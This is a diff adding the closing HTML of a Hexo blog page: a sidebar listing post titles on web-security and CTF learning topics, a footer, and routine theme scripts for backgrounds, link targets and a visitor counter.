+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/10/10/python 正则表达式小结（笔记）/" title="下一篇: python正则表达式小结（笔记）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">从文件上传到浅谈.htaccess文件的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/upload-labs通关总结/">upload-labs通关小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/15/BUUCTF部分web题解/">BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">浅谈文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/Owasp juice shop(一)/">Owasp juice shop(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/PHP代码审计之危险函数/">PHP代码审计之危险函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/22/PHP超级全局变量/">PHP超级全局变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/21/一些常见的编码/">一些常见的编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/17/命令执行&代码执行漏洞/">命令执行&代码执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/Web常见的源码泄露/">Web常见的源码泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/09/RSA算法小结/">RSA算法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/PHP反序列化/">PHP反序列化学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/i春秋-misc系列/">i春秋-misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/文件上传漏洞总结/">文件上传漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/隐写术/">隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/25/SQL注入一些过滤及绕过总结/">SQL注入一些过滤及绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/SQL简单注入/">SQL简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/20/图片隐写/">图片隐写术</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/攻防世界——Misc系列/">攻防世界——Misc系列</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/Web——爆破wp/">WEB——爆破wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/10/WEB——php大法wp/">WEB——php大法wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/08/图片隐写——小苹果wp/">图片隐写——小苹果wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/10/xss挑战之旅学习笔记/">xss挑战之旅学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/07/xss学习总结/">xxs学习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/SQL注入姿势（3）/">SQL注入姿势（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/SQL注入姿势（2）/">SQL注入姿势（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/SQL注入姿势（1）/">SQL注入姿势（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/06/PHP学习笔记（5）/">PHP学习笔记（5）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/PHP学习笔记（4）/">PHP学习笔记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/28/php登录界面小结/">PHP登录界面小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/PHP学习笔记（3）/">PHP学习笔记（3）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/PHP学习笔记（2）/">PHP学习笔记（2）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/07/PHP学习笔记（1）/">PHP学习笔记（1）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/哈弗曼树/">哈弗曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/css学习笔记/">CSS学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/HTML学习笔记/">HTML学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/MySQL的一些常用命令行总结/">MySQL的一些常用命令行总结</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2021 obsem
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
